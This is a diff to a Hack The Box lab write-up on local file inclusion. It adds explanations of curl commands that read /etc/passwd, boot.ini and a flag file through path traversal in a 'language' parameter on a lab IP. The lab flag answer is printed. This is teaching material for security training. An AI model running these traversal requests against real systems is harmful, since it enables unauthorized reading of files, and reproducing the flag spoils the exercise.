@@ -4,12 +4,12 @@
 
 ## Detection
 
-The classic pattern: a dropdown / link sets a parameter that the URL reflects.
+The classic pattern: a dropdown or link sets a parameter that the URL reflects.
 ```
 http://TARGET/index.php?language=en.php   ← parameter loads a file
 ```
 
-Quick test files (no creds needed):
+Quick test files (no credentials needed):
 ```bash
 # Linux
 curl -sk "http://TARGET/index.php?language=/etc/passwd"
@@ -17,8 +17,9 @@ curl -sk "http://TARGET/index.php?language=/etc/passwd"
 # Windows
 curl -sk "http://TARGET/index.php?language=C:\Windows\boot.ini"
 ```
+> Substitutes the language parameter with a known file path. If the file contents appear in the response, the app is vulnerable to LFI. Use `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows.
 
-If the file contents appear in the response → vulnerable.
+If the file contents appear in the response, the app is vulnerable.
 
 ---
 
@@ -123,6 +124,7 @@ Path traversal to `/etc/passwd`:
 ```bash
 curl -sk "http://154.57.164.62:32641/index.php?language=../../../../etc/passwd" | grep '^[a-z]'
 ```
+> Uses four levels of `../` to traverse out of the webroot and read `/etc/passwd`. The `grep '^[a-z]'` filters to lines starting with a lowercase letter, showing only real user accounts.
 
 Result: `barry:x:1000:1000::/home/barry:/bin/sh` — UID 1000 = real user (vs `bin`/`backup` which are system accounts).
 
@@ -133,6 +135,7 @@ Result: `barry:x:1000:1000::/home/barry:/bin/sh` — UID 1000 = real user (vs `b
 ```bash
 curl -sk "http://154.57.164.62:32641/index.php?language=../../../../usr/share/flags/flag.txt"
 ```
+> Same traversal technique but targeting a different absolute path. The number of `../` sequences needed is the same because the webroot depth is the same.
 
 **Answer:** `HTB{n3v3r_tru$t_u$3r_!nput}`
 
